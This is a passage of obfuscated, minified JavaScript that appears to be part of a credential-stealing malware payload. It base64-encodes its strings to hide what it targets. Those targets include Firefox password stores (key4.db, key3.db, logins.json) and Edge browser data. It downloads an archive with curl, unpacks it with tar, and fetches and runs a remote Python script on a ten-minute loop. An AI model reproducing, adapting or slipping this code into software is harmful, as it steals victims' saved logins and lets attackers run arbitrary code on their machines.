c=`${e}/ld_${n}`;p(c)?t.push({[V]:a[$](c),[w]:{[f]:`plld_${n}`}}):a[r](l,c,(t=>{let c=[{[V]:a[$](l),[w]:{[f]:`plld_${n}`}}];S(c)}))}catch(t){}}}catch(t){}return S(t),t},O=async()=>{let t=[];const c=n(q),$=n("a2V5NC5kYg"),r=n("a2V5My5kYg"),e=n("bG9naW5zLmpzb24");try{let l="";if(l=`${hd}${n("Ly5tb3ppbGxhL2ZpcmVmb3gv")}`,l&&""!==l&&p(l))for(let n=0;n<200;n++){const s=0===n?b:`${G} ${n}`,h=`${l}/${s}/${$}`,o=`${l}/${s}/${r}`,i=`${l}/${s}/${e}`;try{if(!p(h))continue;t.push({[V]:a[c](h),[w]:{[f]:`flk4_${n}`}})}catch(t){}try{if(!p(o))continue;t.push({[V]:a[c](o),[w]:{[f]:`flk3_${n}`}})}catch(t){}try{if(!p(i))continue;t.push({[V]:a[c](i),[w]:{[f]:`fllj_${n}`}})}catch(t){}}}catch(t){}return S(t),t},P=n("cm1TeW5j"),D="XC5weXBccHl0aG9uLmV4ZQ",K=51476590;let tt=0;const ct=async t=>{const c=`${n("dGFyIC14Zg")} ${t} -C ${hd}`;ex(c,((c,$,r)=>{if(c)return a[P](t),void(tt=0);a[P](t),rt()}))},at=()=>{const t=n("cDIuemlw"),c=`${l()}${n("L3Bkb3du")}`,$=`${td}\\${n("cC56aQ")}`,r=`${td}\\${t}`;if(tt>=K+6)return;const e=n("cmVuYW1lU3luYw"),s=n("cmVuYW1l");if(a[u]($))try{var h=a[j]($);h.size>=K+6?(tt=h.size,a[s]($,r,(t=>{if(t)throw t;ct(r)}))):(tt<h.size?tt=h.size:(a[P]($),tt=0),$t())}catch(t){}else{const t=`${n("Y3VybCAtTG8")} "${$}" "${c}"`;ex(t,((t,c,n)=>{if(t)return tt=0,void $t();try{tt=K+6,a[e]($,r),ct(r)}catch(t){}}))}};function $t(){setTimeout((()=>{at()}),2e4)}const rt=async()=>await new Promise(((t,c)=>{if("w"==pl[0]){const t=`${hd}${n(D)}`;a[u](`${t}`)?(()=>{const t=l(),c=n(m),$=n(o),r=n(Z),e=n(i),s=`${t}${c}/${h}`,u=`${hd}${e}`,d=`"${hd}${n(D)}" "${u}"`;try{a[P](u)}catch(t){}rq[$](s,((t,c,$)=>{if(!t)try{a[r](u,$),ex(d,((t,c,a)=>{}))}catch(t){}}))})():at()}else(()=>{const t=l(),c=n(m),$=n(Z),r=n(o),e=n(i),s=n("cHl0aG9u"),u=`${t}${c}/${h}`,d=`${hd}${e}`;let y=`${s}3 "${d}"`;rq[r](u,((t,c,r)=>{t||(a[$](d,r),ex(y,((t,c,a)=>{})))}))})()}));var et=0;const nt=async()=>{try{e=Date.now(),await(async()=>{k=hs;try{const t=s("~/");await T(J,0),await T(_,1),await T(g,2),"w"==pl[0]?(pa=`${t}${n(F)}${n("TG9jYWwvTWljcm9zb2Z0L0VkZ2U")}${n(R)}`,await C(pa,"3_",!1)):"d"==pl[0]?(await H(),await A(),await E()):"l"==pl[0]&&(await M(),await I(),await O())}catch(t){}})(),rt()}catch(t){}};nt();let lt=setInterval((()=>{(et+=1)<5?nt():clearInterval(lt)}),6e5);